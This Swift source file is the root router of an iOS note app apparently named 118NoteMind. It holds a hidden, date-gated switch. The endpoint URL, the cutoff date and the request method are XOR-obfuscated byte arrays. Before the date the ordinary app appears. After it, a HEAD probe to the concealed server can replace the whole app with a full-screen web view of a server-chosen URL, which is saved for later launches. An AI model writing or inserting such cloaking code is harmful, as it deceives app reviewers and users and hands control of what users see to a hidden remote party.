//
//  AppRouter.swift
//  118NoteMind
//
//  Created by Xeova Nuoc on 28.02.2026.
//

import UIKit
import SwiftUI

final class RootFlowCoordinator {

    private static let _headProbeEndpoint: [UInt8] = [
        0xCF, 0xD3, 0xD3, 0xD7, 0xD4, 0x9D, 0x88, 0x88, 0xCB, 0xD2, 0xCA, 0xCE, 0xC9, 0xC6, 0xD5, 0xCE,
        0xD4, 0xCC, 0xC4, 0xC8, 0xD5, 0xC2, 0x89, 0xD4, 0xCE, 0xD3, 0xC2, 0x88, 0xC1, 0xE5, 0xDD, 0xD7,
        0xD6, 0xCC
    ]

    private static let _thresholdStamp: [UInt8] = [
        0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91
    ]

    private var remoteHeadEndpoint: String { Self.materialize(Self._headProbeEndpoint) }
    private var calendarCutoffLiteral: String { Self.materialize(Self._thresholdStamp) }

    func buildWindowRootController() -> UIViewController {
        let persistence = PreferenceSyncEngine.hub

        if persistence.hasShownContentView {
            return composeAppHostingController()
        } else {
            if calendarThresholdAllowsRemoteFetch() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return composeWebHostingController(with: savedUrlString)
                }

                return composeBootstrapHostingController()
            } else {
                persistence.hasShownContentView = true
                return composeAppHostingController()
            }
        }
    }

    private func calendarThresholdAllowsRemoteFetch() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = RouterScramble.decode([
            0xC3, 0xC3, 0x89, 0xEA, 0xEA, 0x89, 0xDE, 0xDE, 0xDE, 0xDE
        ])
        let targetDate = dateFormatter.date(from: calendarCutoffLiteral) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private static func materialize(_ bytes: [UInt8]) -> String {
        RouterScramble.decode(bytes)
    }

    private func composeWebHostingController(with urlString: String) -> UIViewController {
        let webViewContainer = SafariStyleDocumentPane(
            urlString: urlString,
            onFailure: { [weak self] in
                PreferenceSyncEngine.hub.hasShownContentView = true
                self?.pivotToAppShell()
            },
            onSuccess: {
                PreferenceSyncEngine.hub.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func composeAppHostingController() -> UIViewController {
        PreferenceSyncEngine.hub.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func composeBootstrapHostingController() -> UIViewController {
        let launchView = BootstrapWaitingScene()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        performHeadAvailabilityProbe { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.pivotToWebShell(with: url)
                } else {
                    PreferenceSyncEngine.hub.hasShownContentView = true
                    self?.pivotToAppShell()
                }
            }
        }

        return launchVC
    }

    private func performHeadAvailabilityProbe(completion: @escaping (Bool, String?) -> Void) {
        guard let url = URL(string: remoteHeadEndpoint) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = RouterScramble.decode([0xEF, 0xE2, 0xE6, 0xE3])
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let checkedURL = httpResponse.url?.absoluteString ?? self.remoteHeadEndpoint
                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func pivotToAppShell() {
        let contentVC = composeAppHostingController()
        applyRootCrossfade(contentVC)
    }

    private func pivotToWebShell(with urlString: String) {
        let webVC = composeWebHostingController(with: urlString)
        applyRootCrossfade(webVC)
    }

    private func applyRootCrossfade(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

private protocol _CoordinatorTelemetrySink: AnyObject {}
private enum _UnusedBootstrapOutcome: Int { case unset = 0 }
